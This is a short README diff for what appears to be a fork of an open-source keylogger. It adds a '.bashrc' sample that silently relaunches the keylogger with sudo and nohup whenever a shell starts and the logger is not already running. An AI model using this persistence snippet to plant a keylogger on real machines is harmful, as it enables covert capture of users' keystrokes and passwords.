@@ -3,3 +3,10 @@
 
 # Confer original project
 - https://github.com/caseyscarborough/keylogger
+
+# .bashrc sample
+```
+if [ "$(ps -ef|grep keylogger|grep -v grep)" == "" ]; then
+  nohup sudo ./keylogger &
+fi
+```
